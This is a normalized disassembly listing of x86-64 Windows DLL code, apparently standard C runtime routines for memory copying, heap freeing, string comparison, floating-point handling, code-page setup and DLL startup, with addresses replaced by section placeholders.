mov eax edi
jmp r-xdata
mov [ rbp ] rbx
or edi 0xffffffff
mov r12b 0x2b
mov [ r14 ] 0x1
xor edx edx
div esi
cmp eax [ rsp + 0x90 ]
je r-xdata
add rsp 0x38
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_180018338
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x30
movaps [ rax - 0x18 ] xmm6
mov rbp r9
mov r12d r8d
mov rbx rdx
mov rdi rcx
call sub_1800194ec
mov esi [ rax ]
call sub_1800194ec
mov rdx rbx
and [ rax ] 0x0
mov rcx rdi
call sub_18001d43c
movapd xmm6 xmm0
call sub_1800194ec
mov ecx [ rax ]
mov [ rbp ] ecx
call sub_1800194ec
movsd xmm0 [ r--data ]
mov [ rax ] esi
jmp r-xdata
test r12d r12d
jg r-xdata
mulsd xmm6 xmm0
dec r12d
jns r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
movapd xmm0 xmm6
movaps xmm6 [ rsp + 0x20 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
neg r12d
mov eax r12d
dec rax
divsd xmm6 xmm0
jne r-xdata
sub_1800183dc
sub rsp 0x28
mov rax [ rw-data ]
test rax rax
jne r-xdata
dec rax
mov [ rw-data ] rax
call [ EncodePointer@IAT ]
mov rcx [ rw-data ]
lea rdx [ rw-data ]
mov [ rdx + rcx * 8 ] rax
add rsp 0x28
retn
add rsp 0x28
jmp sub_18001d444
sub_1800184a0
test rdx rdx
je r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
mov rcx rdx
mov rbx rdx
call sub_180019aa0
mov rsi rax
lea rcx [ rax + 0x1 ]
call sub_18001b358
mov [ rdi + 0x8 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
lea rdx [ rsi + 0x1 ]
mov r8 rbx
mov rcx rax
call sub_18001d5ec
mov [ rdi + 0x10 ] 0x1
sub_180018524
push rbx
sub rsp 0x20
and [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
mov [ rcx + 0x10 ] 0x0
mov [ rcx ] rax
mov rdx [ rdx ]
mov rbx rcx
call sub_1800184a0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180018554
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rcx rdx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
call sub_1800184fc
cmp [ rdi + 0x10 ] 0x0
je r-xdata
mov rax [ rdi + 0x8 ]
mov [ rbx + 0x8 ] rax
mov rdx [ rdi + 0x8 ]
mov rcx rbx
call sub_1800184a0
jmp r-xdata
sub_1800185d4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_1800184fc
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180018b3c
sub_180018670
mov r11 rcx
sub rdx rcx
jb r-xdata
add rcx r8
cmp r8 0x8
jb r-xdata
cmp r8 0x8
jb r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov al [ rdx + rcx ]
mov [ rcx ] al
inc rcx
dec r8
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
inc rcx
cmp rdx 0xfffffffffffff000
ja r-xdata
mov rax [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
sub rcx 0x20
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x10 ] r10
mov rax [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec r9
mov [ rcx + 0x8 ] rax
mov [ rcx ] r10
jne r-xdata
sub rcx 0x8
mov rax [ rdx + rcx ]
dec r9
mov [ rcx ] rax
jne r-xdata
test cl 0x4
je r-xdata
sub rcx 0x2
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
cmp rdx 0x1000
jb r-xdata
mov rax [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
add rcx 0x20
mov [ rcx - 0x20 ] rax
mov [ rcx - 0x18 ] r10
mov rax [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec r9
mov [ rcx - 0x10 ] rax
mov [ rcx - 0x8 ] r10
jne r-xdata
mov rax [ rdx + rcx ]
mov [ rcx ] rax
add rcx 0x8
dec r9
jne r-xdata
test cl 0x4
je r-xdata
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
add rcx 0x2
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
sub rcx 0x4
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
add rcx 0x4
sub rcx 0x80
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
dec eax
jne r-xdata
add rcx 0x1000
mov eax 0x40
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
add rcx 0x80
dec eax
jne r-xdata
sub rcx 0x1000
mov eax 0x40
mov r9 [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
movnti [ rcx - 0x8 ] r9
movnti [ rcx - 0x10 ] r10
mov r9 [ rdx + rcx - 0x18 ]
mov r10 [ rdx + rcx - 0x20 ]
movnti [ rcx - 0x18 ] r9
movnti [ rcx - 0x20 ] r10
mov r9 [ rdx + rcx - 0x28 ]
mov r10 [ rdx + rcx - 0x30 ]
sub rcx 0x40
movnti [ rcx + 0x18 ] r9
movnti [ rcx + 0x10 ] r10
mov r9 [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec eax
movnti [ rcx + 0x8 ] r9
movnti [ rcx ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
mov r9 [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
movnti [ rcx ] r9
movnti [ rcx + 0x8 ] r10
mov r9 [ rdx + rcx + 0x10 ]
mov r10 [ rdx + rcx + 0x18 ]
movnti [ rcx + 0x10 ] r9
movnti [ rcx + 0x18 ] r10
mov r9 [ rdx + rcx + 0x20 ]
mov r10 [ rdx + rcx + 0x28 ]
add rcx 0x40
movnti [ rcx - 0x20 ] r9
movnti [ rcx - 0x18 ] r10
mov r9 [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec eax
movnti [ rcx - 0x10 ] r9
movnti [ rcx - 0x8 ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
[ rsp ] 0x0
jmp r-xdata
[ rsp ] 0x0
jmp r-xdata
sub_1800189ac
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_18001d650
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180018b3c
sub_180018a08
push rbx
sub rsp 0x40
mov rbx rcx
jmp r-xdata
call sub_18001b358
test rax rax
je r-xdata
mov rcx rbx
call sub_18001d788
test eax eax
je r-xdata
add rsp 0x40
pop rbx
retn
mov eax [ rw-data ]
mov r8d 0x1
lea rbx [ r--data ]
test r8b al
jne r-xdata
mov rcx rbx
lea rdx [ rw-data ]
lea rcx [ rsp + 0x20 ]
call sub_180018610
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rbx
call sub_180019410
int3
or eax r8d
lea rdx [ rsp + 0x58 ]
lea rcx [ rw-data ]
mov [ rw-data ] eax
lea rax [ r--data ]
mov [ rsp + 0x58 ] rax
call sub_180018470
lea rcx [ sub_18002c968 ]
mov [ rw-data ] rbx
call sub_18001a3a8
sub_180018ab4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r9
mov rsi r8
mov rdi rdx
test r9 r9
jne r-xdata
test rcx rcx
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
je r-xdata
call sub_1800194ec
mov ebx 0x16
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov r8 rdx
xor edx edx
call sub_18001d7d0
test rsi rsi
je r-xdata
cmp rdx rbx
jb r-xdata
cmp rdi rbx
jae r-xdata
mov r8 rbx
mov rdx rsi
call sub_180018670
jmp r-xdata
mov eax 0x16
call sub_1800194ec
mov ebx 0x22
jmp r-xdata
mov [ rax ] ebx
call sub_18001dab4
mov eax ebx
jmp r-xdata
sub_180018b3c
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
add rsp 0x20
pop rbx
call sub_1800194ec
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_1800194a4
mov [ rbx ] eax
sub_180018b7c
push rbx
sub rsp 0x20
mov rax r8
test r9 r9
je r-xdata
xor eax eax
test rcx rcx
jne r-xdata
test rax rax
je r-xdata
call sub_1800194ec
mov ebx 0x16
cmp rdx r9
jae r-xdata
add rsp 0x20
pop rbx
retn
mov r8 r9
mov rdx rax
call sub_180018670
call sub_1800194ec
mov ebx 0x22
jmp r-xdata
mov [ rax ] ebx
call sub_18001dab4
mov eax ebx
jmp r-xdata
sub_180018c48
sub rsp 0x38
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x20 ] rax
mov al [ rdx ]
xor r9d r9d
mov r11 rdx
mov [ rsp ] r9
mov [ rsp + 0x8 ] r9
mov [ rsp + 0x10 ] r9
mov [ rsp + 0x18 ] r9
mov r10 rcx
jmp r-xdata
mov edx 0x1
test al al
jne r-xdata
movzx r8d al
movzx eax al
and eax 0x7
shr r8 0x3
mov cl al
shl dl cl
or [ rsp + r8 ] dl
inc r11
mov al [ r11 ]
or [ rsp ] dl
jmp r-xdata
movzx r8d [ r10 ]
mov ecx r8d
shr r8 0x3
and ecx 0x7
shl edx cl
test [ rsp + r8 ] dl
je r-xdata
inc r9d
mov edx 0x1
inc r10
movsxd rax r9d
mov rcx [ rsp + 0x20 ]
xor rcx rsp
call sub_180018450
add rsp 0x38
retn
sub_180018cdc
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx + 0x18 ] 0x0
test rdx rdx
jne r-xdata
movups xmm0 [ rdx ]
movdqu [ rcx ] xmm0
call sub_18001e320
mov [ rbx + 0x10 ] rax
mov rdx [ rax + 0xc0 ]
mov [ rbx ] rdx
mov rcx [ rax + 0xb8 ]
mov [ rbx + 0x8 ] rcx
cmp rdx [ rw-data ]
je r-xdata
mov rax [ rw-data ]
cmp [ rbx + 0x8 ] rax
je r-xdata
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
mov rax [ rbx + 0x10 ]
test [ rax + 0xc8 ] 0x2
jne r-xdata
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_18001e138
mov [ rbx ] rax
mov rax rbx
add rsp 0x20
pop rbx
retn
or [ rax + 0xc8 ] 0x2
mov [ rbx + 0x18 ] 0x1
jmp r-xdata
call sub_18001e7b8
mov [ rbx + 0x8 ] rax
sub_180018d80
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rsi rcx
mov rdi rdx
lea rcx [ rax - 0x28 ]
mov rdx r8
call sub_180018cdc
xor ebp ebp
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
cmp [ rsp + 0x38 ] bpl
je r-xdata
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x14 ] ebp
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
movzx ecx [ rsi ]
lea rdx [ rsp + 0x20 ]
call sub_18001ed84
movzx ecx [ rdi ]
lea rdx [ rsp + 0x20 ]
movzx ebx ax
add rsi 0x2
call sub_18001ed84
add rdi 0x2
test bx bx
je r-xdata
sub rsi rdi
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
movzx ecx ax
movzx eax bx
sub eax ecx
cmp [ rsp + 0x38 ] bpl
je r-xdata
cmp bx ax
je r-xdata
movzx eax [ rdi ]
cmp ax 0x41
jb r-xdata
cmp bx 0x5a
ja r-xdata
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
add rdi 0x2
test bx bx
je r-xdata
cmp ax 0x5a
ja r-xdata
add bx 0x20
cmp bx ax
je r-xdata
add ax 0x20
movzx ebx [ rsi + rdi ]
cmp bx 0x41
jb r-xdata
jmp r-xdata
sub_180018e84
sub rsp 0x28
xor r8d r8d
mov r9 rcx
cmp [ rw-data ] r8d
jne r-xdata
add rsp 0x28
jmp sub_180018d80
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
mov eax 0x7fffffff
add rsp 0x28
retn
sub r9 rdx
movzx ecx [ rdx ]
cmp cx 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
add rdx 0x2
test ax ax
je r-xdata
cmp cx 0x5a
ja r-xdata
add ax 0x20
movzx ecx cx
movzx eax ax
sub eax ecx
add rsp 0x28
retn
cmp ax cx
je r-xdata
add cx 0x20
movzx eax [ r9 + rdx ]
cmp ax 0x41
jb r-xdata
sub_180018f0c
push rbx
sub rsp 0x20
xor ebx ebx
mov r10 r8
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_1800194ec
mov ebx 0x16
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
jne r-xdata
mov [ rcx ] bx
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov r11 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] bx
sub r10 rcx
sub r11 r10
test r9 r9
jne r-xdata
dec r8
je r-xdata
test r8 r8
jne r-xdata
dec r8
jne r-xdata
mov [ r11 ] bx
dec r9
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
movzx eax [ r10 ]
mov [ r11 + r10 ] ax
add r10 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ r10 + r11 ]
mov [ r11 ] ax
add r11 0x2
test ax ax
je r-xdata
mov [ rcx ] bx
call sub_1800194ec
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx * 2 - 0x2 ] bx
lea eax [ r8 + 0x50 ]
jmp r-xdata
mov [ rax ] ebx
call sub_18001dab4
mov eax ebx
sub_180018fdc
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x20 ] rsi
movsd [ rax + 0x8 ] xmm0
push rdi
sub rsp 0x40
mov ebx edx
movaps [ rax - 0x18 ] xmm6
mov esi 0xffc0
mov ecx 0x1f80
mov edx esi
movapd xmm6 xmm0
call sub_18001f8e4
movzx ecx [ rsp + 0x56 ]
mov rdi rax
mov eax 0x7ff0
and cx ax
cmp cx ax
jne r-xdata
ucomisd xmm6 [ r--data ]
jpe r-xdata
movapd xmm0 xmm6
call sub_18001f6fc
test eax eax
jle r-xdata
lea rdx [ rsp + 0x60 ]
movapd xmm0 xmm6
call sub_18001f770
mov ecx [ rsp + 0x60 ]
test ebx ebx
jns r-xdata
je r-xdata
movapd xmm0 xmm6
mov ecx 0x8
addsd xmm0 [ r--data ]
jmp r-xdata
cmp eax 0x2
jle r-xdata
mov eax 0x7fffffff
sub eax ebx
cmp ecx eax
jg r-xdata
mov eax 0x80000000
sub eax ebx
cmp ecx eax
jl r-xdata
mov rdx rsi
mov rcx rdi
call sub_18001f8e4
movapd xmm0 xmm6
jmp r-xdata
movd xmm3 ebx
movapd xmm2 xmm6
mov edx 0x19
mov [ rsp + 0x28 ] rdi
movsd [ rsp + 0x20 ] xmm0
cvtdq2pd xmm3 xmm3
call sub_18001f584
cmp eax 0x3
jne r-xdata
movapd xmm1 xmm0
movsd xmm0 [ rw-data ]
call sub_18001f68c
lea edx [ rcx + rbx ]
cmp edx 0xa00
jg r-xdata
mulsd xmm0 [ r--data ]
jmp r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
movaps xmm6 [ rsp + 0x30 ]
add rsp 0x40
pop rdi
retn
movd xmm2 ebx
lea ecx [ rax + 0x16 ]
movapd xmm1 xmm6
mov r9 rdi
cvtdq2pd xmm2 xmm2
call sub_18001f51c
jmp r-xdata
cmp edx 0x400
jle r-xdata
cmp edx 0xfffff603
jge r-xdata
add edx 0xfffffa00
call sub_18001f6c4
jmp r-xdata
cmp edx 0xfffffc03
jge r-xdata
mov ecx 0x11
call sub_18001f6c4
movapd xmm6 xmm0
add edx 0x600
call sub_18001f6c4
jmp r-xdata
mov ecx 0x12
jmp r-xdata
sub_180019160
mov [ rsp + 0x18 ] r8
push rbx
sub rsp 0x20
mov rbx r8
cmp edx 0x1
jne r-xdata
test edx edx
jne r-xdata
call sub_18001dad4
test eax eax
jne r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
call sub_18001e4b8
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp edx 0x3
jne r-xdata
call sub_180026b48
mov edx 0x2c8
mov ecx 0x1
call sub_18001b79c
mov rbx rax
test rax rax
je r-xdata
dec eax
mov [ rw-data ] eax
cmp [ rw-data ] edx
jne r-xdata
call sub_180020758
call [ GetCommandLineA@IAT ]
mov [ rw-data ] rax
call sub_180020664
mov [ rw-data ] rax
call sub_18001ff24
test eax eax
jns r-xdata
call sub_18001db2c
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov eax 0x1
xor ecx ecx
call sub_18001e478
mov rdx rax
mov ecx [ rw-data ]
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
test rbx rbx
jne r-xdata
call sub_18001feec
call sub_18002056c
test eax eax
js r-xdata
call sub_18001e1bc
jmp r-xdata
call sub_180018b3c
jmp r-xdata
xor edx edx
call sub_18001e1e4
call [ GetCurrentThreadId@IAT ]
mov [ rbx ] eax
or [ rbx + 0x8 ] 0xffffffffffffffff
jmp r-xdata
test rbx rbx
jne r-xdata
call sub_1800201f8
call sub_18001e1bc
call sub_18001db2c
nop
call sub_1800201f8
jmp r-xdata
call sub_18002026c
test eax eax
js r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
xor ecx ecx
call sub_18001fca0
test eax eax
jne r-xdata
call sub_18001e1bc
jmp r-xdata
inc [ rw-data ]
jmp r-xdata
sub_1800192b4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x30
mov rsi r8
mov ebx edx
mov r12 rcx
mov eax 0x1
test edx edx
jne r-xdata
cmp edx 0x1
je r-xdata
cmp [ rw-data ] edx
jne r-xdata
mov r9 [ r--data ]
test r9 r9
je r-xdata
cmp edx 0x2
jne r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
call r9
mov [ rsp + 0x20 ] eax
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_180001050
mov edi eax
mov [ rsp + 0x20 ] eax
cmp ebx 0x1
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
xor eax eax
jmp r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_180019160
mov [ rsp + 0x20 ] eax
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
test eax eax
jne r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_180019160
neg eax
sbb ecx ecx
and ecx edi
mov edi ecx
mov [ rsp + 0x20 ] ecx
je r-xdata
cmp ebx 0x3
jne r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call sub_180001050
mov r8 rsi
xor edx edx
mov rcx r12
call sub_180019160
mov r11 [ r--data ]
test r11 r11
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ r--data ]
test rax rax
je r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call r11
mov r8 rsi
mov edx ebx
mov rcx r12
call rax
mov edi eax
mov [ rsp + 0x20 ] eax
_start
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov ebx edx
mov rsi rcx
cmp edx 0x1
jne r-xdata
mov r8 rdi
mov edx ebx
mov rcx rsi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_1800192b4
call sub_1800209ac
sub_180019410
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x60
mov rdi rdx
mov rbx rcx
lea rcx [ rbp - 0x40 ]
lea rdx [ r--data ]
mov r8d 0x40
call sub_180018670
lea rdx [ rbp + 0x10 ]
mov rcx rdi
mov [ rbp - 0x18 ] rbx
mov [ rbp - 0x10 ] rdi
call RtlPcToFileHeader
mov r11 rax
mov [ rbp + 0x10 ] rax
mov [ rbp - 0x8 ] rax
test rdi rdi
je r-xdata
mov r8d [ rbp - 0x28 ]
mov edx [ rbp - 0x3c ]
mov ecx [ rbp - 0x40 ]
lea r9 [ rbp - 0x20 ]
call [ RaiseException@IAT ]
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
test [ rdi ] 0x8
mov ecx 0x1994000
je r-xdata
mov eax [ rbp - 0x20 ]
test r11 r11
cmove eax ecx
mov [ rbp - 0x20 ] eax
mov [ rbp - 0x20 ] ecx
jmp r-xdata
sub_1800194a4
lea r9 [ rw-data ]
xor eax eax
mov rdx r9
lea r8d [ rax + 0x8 ]
cdqe
mov eax [ r9 + rax * 8 + 0x4 ]
retn
inc eax
add rdx r8
cmp eax 0x2d
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
lea eax [ rcx - 0x13 ]
cmp eax 0x11
ja r-xdata
add ecx 0xffffff44
mov eax 0x16
cmp ecx 0xe
cmovbe eax r8d
retn
mov eax 0xd
retn
sub_18001952c
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18001e29c
test rax rax
jne r-xdata
add rax 0x14
lea rax [ rw-data ]
jmp r-xdata
mov ecx ebx
call sub_1800194a4
mov [ r10 ] eax
add rsp 0x20
pop rbx
retn
lea r10 [ rax + 0x10 ]
mov [ rax ] ebx
call sub_18001e29c
lea r10 [ rw-data ]
test rax rax
je r-xdata
sub_180019574
mov r11 rsp
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x90
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x88 ] rax
xor ebx ebx
mov rdi rcx
mov [ r11 - 0x58 ] rcx
mov [ rsp + 0x58 ] rbx
mov r13d ebx
mov r15d ebx
mov r14d ebx
mov r12d ebx
mov [ r11 - 0x50 ] rbx
cmp [ rcx + 0x14 ] ebx
je r-xdata
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
lea rbp [ rcx + 0x4 ]
lea esi [ rbx + 0x1 ]
cmp [ rbp ] ebx
jne r-xdata
lea rax [ r--data ]
mov esi 0x1
mov [ rcx + 0x130 ] rbx
mov [ rcx + 0x140 ] rax
lea rax [ r--data ]
mov [ rcx + 0x138 ] rbx
mov [ rcx + 0x148 ] rax
lea rax [ r--data ]
mov [ rcx + 0x10c ] esi
mov [ rcx + 0x150 ] rax
xor eax eax
[ rax ]
mov ecx 0x4
call sub_18001b71c
mov r12d 0x180
mov edx 0x2
mov ecx r12d
mov [ rsp + 0x58 ] rax
call sub_18001b79c
mov rdx rsi
mov ecx r12d
mov r13 rax
call sub_18001b79c
mov rdx rsi
mov ecx r12d
mov r15 rax
call sub_18001b79c
lea ecx [ r12 - 0x7f ]
mov rdx rsi
mov r14 rax
call sub_18001b79c
mov r12 rax
mov rax [ rsp + 0x58 ]
test rax rax
je r-xdata
movzx r8d [ rcx + 0x30 ]
lea rcx [ r11 - 0x58 ]
xor edx edx
mov r9d 0x1004
mov [ rsp + 0x20 ] rbp
call sub_180020c40
test eax eax
jne r-xdata
mov rcx [ rsp + 0x58 ]
call sub_180018b3c
mov rcx r13
call sub_180018b3c
mov rcx r15
call sub_180018b3c
mov rcx r14
call sub_180018b3c
mov ebx esi
test r13 r13
je r-xdata
mov rcx [ rsp + 0x88 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
test r12 r12
je r-xdata
test r15 r15
je r-xdata
test r14 r14
je r-xdata
mov [ rax ] ebx
mov rcx r12
mov eax ebx
mov [ rcx ] al
add eax esi
add rcx rsi
cmp eax 0x100
jl r-xdata
mov ecx [ rbp ]
lea rdx [ rsp + 0x70 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ rsp + 0x70 ] 0x5
ja r-xdata
movzx eax [ rsp + 0x70 ]
mov [ rsp + 0x50 ] eax
cmp eax esi
jle r-xdata
mov eax [ rbp ]
mov [ rsp + 0x38 ] ebx
lea rcx [ r13 + 0x100 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rcx
xor ecx ecx
mov r9d 0x100
mov r8 r12
mov edx esi
call sub_180020bc0
test eax eax
je r-xdata
cmp [ rsp + 0x76 ] bl
je r-xdata
mov eax [ rbp ]
mov edx [ rdi + 0x14 ]
mov [ rsp + 0x40 ] ebx
mov [ rsp + 0x38 ] eax
mov eax 0xff
lea rcx [ r15 + 0x81 ]
mov [ rsp + 0x30 ] eax
mov [ rsp + 0x28 ] rcx
lea r8d [ rax + 0x1 ]
lea r9 [ r12 + 0x1 ]
xor ecx ecx
mov [ rsp + 0x20 ] eax
call sub_18001bbb0
test eax eax
je r-xdata
lea rcx [ rsp + 0x77 ]
mov eax [ rbp ]
mov edx [ rdi + 0x14 ]
mov [ rsp + 0x40 ] ebx
mov [ rsp + 0x38 ] eax
mov eax 0xff
lea rcx [ r14 + 0x81 ]
mov [ rsp + 0x30 ] eax
mov [ rsp + 0x28 ] rcx
lea r9 [ r12 + 0x1 ]
xor ecx ecx
mov r8d 0x200
mov [ rsp + 0x20 ] eax
call sub_18001bbb0
test eax eax
je r-xdata
movzx edx [ rcx - 0x1 ]
jmp r-xdata
lea rbp [ r13 + 0xfe ]
mov [ rbp ] bx
mov [ r15 + 0x7f ] bl
mov [ r14 + 0x7f ] bl
mov [ r15 + 0x80 ] bl
mov [ r14 + 0x80 ] bl
cmp [ rsp + 0x50 ] esi
jle r-xdata
movzx eax [ rcx ]
cmp edx eax
jle r-xdata
lea rdx [ r13 + 0x200 ]
mov r8d 0xfe
mov rcx r13
call sub_180018670
lea rdx [ r15 + 0x100 ]
mov r8d 0x7f
mov rcx r15
call sub_180018670
lea rdx [ r14 + 0x100 ]
mov r8d 0x7f
mov rcx r14
call sub_180018670
mov rcx [ rdi + 0x130 ]
test rcx rcx
je r-xdata
cmp [ rsp + 0x76 ] bl
je r-xdata
movsxd rax edx
add edx esi
mov [ rax + r12 ] 0x20
add rcx 0x2
cmp [ rcx - 0x1 ] bl
jne r-xdata
mov rax [ rsp + 0x58 ]
mov [ rax ] esi
mov [ rdi + 0x130 ] rax
lea rax [ r13 + 0x100 ]
mov [ rdi + 0x140 ] rax
lea rax [ r15 + 0x80 ]
mov [ rdi + 0x138 ] rbp
mov [ rdi + 0x148 ] rax
lea rax [ r14 + 0x80 ]
mov [ rdi + 0x150 ] rax
mov eax [ rsp + 0x50 ]
mov [ rdi + 0x10c ] eax
jmp r-xdata
[ rcx ]
jne r-xdata
lea rcx [ rsp + 0x77 ]
cmp [ rcx ] bl
je r-xdata
mov rcx r12
